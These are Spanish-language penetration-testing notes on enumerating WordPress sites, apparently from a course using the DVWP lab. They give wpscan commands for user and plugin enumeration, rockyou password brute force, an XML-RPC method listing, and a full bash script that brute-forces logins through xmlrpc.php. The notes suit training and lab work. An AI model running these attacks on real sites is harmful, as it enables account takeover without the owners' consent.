# WordPress

Tags: #WordPress #CMS 

## Enumeración de gestores de contenido (CMS) – WordPress

WordPress es un CMS de código abierto muy popular que fue lanzado en 2003. Es utilizado por millones de sitios web en todo el mundo y se destaca por su facilidad de uso y flexibilidad. Con WordPress, los usuarios pueden crear y personalizar sitios web sin necesidad de conocimientos de programación avanzados. Además, cuenta con una amplia variedad de plantillas y plugins que permiten añadir funcionalidades adicionales al sitio.

El proyecto que utilizamos en esta clase para enumerar un WordPress es el siguiente:

-   **DVWP**: [https://github.com/vavkamil/dvwp](https://github.com/vavkamil/dvwp)

Una de las herramientas que utilizamos en esta clase para enumerar este gestor de contenido es **Wpscan**. Wpscan es una herramienta de código abierto que se utiliza para escanear sitios web en busca de vulnerabilidades de seguridad en WordPress.

Con Wpscan, podemos realizar una enumeración completa del sitio web y obtener información detallada sobre la instalación de WordPress, como la versión utilizada, los plugins y temas instalados y los usuarios registrados en el sitio. También nos permite realizar pruebas de fuerza bruta para descubrir contraseñas débiles y vulnerabilidades conocidas en plugins y temas.

Wpscan es una herramienta muy útil para los administradores de sitios web que desean mejorar la seguridad de su sitio WordPress, ya que permite identificar y corregir vulnerabilidades antes de que sean explotadas por atacantes malintencionados. Además, es una herramienta fácil de usar y muy efectiva para identificar posibles debilidades de seguridad en nuestro sitio web.

## Rutas típicas de WordPress en la web 

```python
/wp-login.php                        # Es la ruta del panel de autenticación 
/wordpress/wp-login.php
/wp-admin.php                        # Es la ruta del panel de autenticación de admin
/wp-admin/
/wp-json/wp/v2/users/                # Reporta usuarios validos en la pagina de WordPress en formato Json
/wp-content/plugins                  # Ver si podemos hacer 'directory listing' y ver los plugins existentes
/xmlrpc.php                          # Si esta expuesto, podemos enumerar usuarios 
```

## Ruta típica en consola

```python 
/var/www/html/                 # Ruta donde se encuentra 'phpinfo.php | wordpress | index.html'

# Archivos que se encuentran en 'admin', este tiene la configuracion del 'phpadmin'

# Archivos que se enecuentran dentro del directorio 'WordPress'
wordpress.conf                 # Archivo con configuracion del WordPress y se encuentra en /etc/apache2/sites-enabled/ 
wp-config.php                  # Archivo con credenciales de acceso a la DB, se encuentra en /var/www/html, o en la ruta /usr/share/wordpress/ y contiene todas las configuraciones 
wp-settings.php                # Se encarga de hacer la subida de los plugins


/wp-admin/                     # Directorio que contiene el formulario y se encuentra en /var/www/html/wordpress 
/wp-content/                   # Directorio que contiene los 'plugins, themes'
Nota: No se cuenta el 'index.php' como tema o plugin, ademas, si existe un 'plugin' que puede ser vulnerable, lo podemos explotar con 'Metasploit'
```
 
## WordPress Enumeración 

```bash 
# Enumeración
1. Buscar usuarios en la pagina Web y validarlos en el 'Panel de Login'
2. Aunque tengamos la utlima version de 'WordPress' mientras tenga 'Plugins' desactualizados, será vulnerable 
3. Buscar 'plugins' en el codigo fuente o usando el comando 'curl'
```

```bash
❯ wpscan --url ❮http://IP/❯                               # Detecta vulnerabilidades en un wordPress
```

```bash
❯ wpscan --url <http://URL/> -e u,vp                                          # Enumeracion 

	# e = Enumerar multiples cosas 
	# u = Enumerar usuarios
	# vp = Enumerar plugins vulnerables

❯ wpscan --url http://URL/ --passwords /usr/share/wordlists/rockyou.txt       # BruteForce

	# passwords = Enumerar passwords

❯ wpscan --url <http://URL/> -e u,vp --plugins-detection aggressive           # Enumeracion de plugins de manera agresiva 
	
	# plugins-detection = Enumeracion de plugins (mixed, passive, aggressive)
```

El **API Token** lo podemos descargar registrándonos desde la siguiente url:
* [API-Token](https://wpscan.com/register)

```bash
❯ wpscan --url <http://URL/> -e vp --api-token="DFFGB15GD68DG618GD81GRD"     # Enumeracion 

	# vp = Enumerar plugins vulnerables
	# api-token = Nos representa de mejor manera las vulnerabilidades con el API Token
```

```bash
❯ wpscan --url <http://IP/> -U <USER> -P /usr/share/wordlists/rockyou.txt # Fuerza bruta

	# P = Ruta del diccionario 
	# U = Usuario valido
```

```bash
❯ curl -s -X GET "http://IP/" | grep -oP 'plugins/\k[^/]+' | sort -u # Filtramos por plugins en la pagina web y ver si alguno es vulnerable y lo podriamos buscar en Searchsploit

	# \K = Quita la palabra de la izquierda (plugins) 
	# [^/]+ = Muestra hasta la primer barra derecha en la busqueda y quita todo lo de la derecha   
	# sort u = Quitar los resultados repetidos y dejar los 'unicos'
	# s = Modo silencioso 
```

## Abusando de xmlrpc.php

Si esta expuesto, podemos enumerar credenciales validas y solo acepta peticiones por **POST** y que este estructurada en **XML**
* Debemos de listar los métodos y lo haremos con el código del archivo y ver si existe el siguiente **wp.getUsersBlogs** y después aplicar fuerza bruta
* [Xmlrpc-Abuse](https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/)

```bash
❯ curl -s -X POST "http://IP/xmlrpc.php" -d@file.xml   # Forma de tramitar el archivo por POST

	# d@ = Indicamos el archivo que usaremos y es que esta abajo 
```

```bash
# Listamos los métodos en 'xmlrpc.php'

❯ nvim file.xml

	<?xml version="1.0" encoding="utf-8"?> 
	<methodCall> 
	<methodName>system.listMethods</methodName> 
	<params></params> 
	</methodCall>
```

```bash 
# Creamos un archivo llamado 'xmlrpc_bruteforce.sh' para hacer el ataque 'Brute force' y enumerar 

#!/bin/bash 

function ctrl_c(){
	echo -e "\n\n[!] Saliendo...\n"
	tput cnorm; exit 1
}

# Ctrl_c
trap ctrl_c INT

tput civis

function createXML(){
	password=$1

	xmlFile="""
	<?xml version=\"1.0\" encoding=\"UTF-8\"?>
	<methodCall> 
	<methodName>wp.getUsersBlogs</methodName> 
	<params> 
	<param><value>omar</value></param> 
	<param><value>$password</value></param> 
	</params> 
	</methodCall>
	"""
	echo $xmlFile > file.xml
	response=$(curl -s -X POST "http://IP/xmlrpc.php" -d@file.xml)

	if [ ! "$(echo $response | grep 'Incorrect username or password.')" ]; then 
		echo -e "\n[+] La contraseña para el usuario omar es $password"
		echo 0
	fi
}

cat /usr/share/wordlists/rockyou.txt | while read password; do 
	createXML $password
done 
```